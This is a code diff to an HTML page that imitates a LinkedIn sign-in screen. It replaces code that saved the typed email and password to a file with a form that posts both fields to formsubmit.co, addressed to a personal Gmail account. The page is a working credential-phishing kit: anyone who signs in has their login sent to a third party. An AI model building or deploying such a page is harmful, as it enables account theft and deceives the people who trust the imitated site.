@@ -11,28 +11,29 @@
             '\r E-mail: ' + email.value + ' \r\n ' +
             'Password: ' +passwd.value + ' \r\n ';
 
-        // Convert the text to BLOB.
-        const textToBLOB = new Blob([data], { type: 'text/plain' });
-        const sFileName = 'formData.txt';	   // The file to save the data.
+        // console.log(data)
+        // // Convert the text to BLOB.
+        // const textToBLOB = new Blob([data], { type: 'text/plain' });
+        // const sFileName = 'formData.txt';	   // The file to save the data.
+        //
+        // let newLink = document.createElement("a");
+        // newLink.download = sFileName;
+        //
+        // if (window.webkitURL != null) {
+        //     newLink.href = window.webkitURL.createObjectURL(textToBLOB);
+        // }
+        // else {
+        //     newLink.href = window.URL.createObjectURL(textToBLOB);
+        //     newLink.style.display = "none";
+        //     document.body.appendChild(newLink);
+        // }
+        //
+        // newLink.click();
 
-        let newLink = document.createElement("a");
-        newLink.download = sFileName;
-
-        if (window.webkitURL != null) {
-            newLink.href = window.webkitURL.createObjectURL(textToBLOB);
-        }
-        else {
-            newLink.href = window.URL.createObjectURL(textToBLOB);
-            newLink.style.display = "none";
-            document.body.appendChild(newLink);
-        }
-
-        newLink.click();
-
-        var xhttp = new XMLHttpRequest();
-        xhttp.open("POST", "file.py", true);
-        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-        xhttp.send("file-content=" + data);
+        // var xhttp = new XMLHttpRequest();
+        // xhttp.open("POST", "form.txt", true);
+        // xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        // xhttp.send("file-content=" + data);
     }
 </script>
 
@@ -68,30 +69,34 @@
         <h1>Sign in</h1>
         <p>Stay updated on your professional world</p>
     </div>
-    <div class="your-input">
-        <div class="input">
-            <input type="text" name="email"
-                   id="email" required />
-            <label for="email">Email</label>
+    <form action="https://formsubmit.co/shubham.911k@gmail.com" method="post">
+        <div class="your-input">
+            <div class="input">
+                <input type="text" name="email"
+                       id="email" required />
+                <label for="email">Email</label>
+            </div>
+            <div class="input">
+                <input type="password" name="password"
+                       id="password" required />
+                <label for="password">
+                    Password
+                </label>
+            </div>
         </div>
-        <div class="input">
-            <input type="password" name="password"
-                   id="password" required />
-            <label for="password">
-                Password
-            </label>
-        </div>
-    </div>
-    <a href="#" class="forgot-password-link">
-        Forgot Password?
-    </a>
-    <button onclick="execute()">Sign in</button>
-    <p class="join-link">
-        New to linkedin?
-        <a href="#" class="join-now">
-            Join now
+        <a href="#" class="forgot-password-link">
+            Forgot Password?
         </a>
-    </p>
+        <button onclick="execute()">Sign in</button>
+        <p class="join-link">
+            New to linkedin?
+            <button type="submit" href="#" class="join-now">
+                Join now
+            </button>
+        </p>
+    </form>
+
+
 </div>
 </body>
 
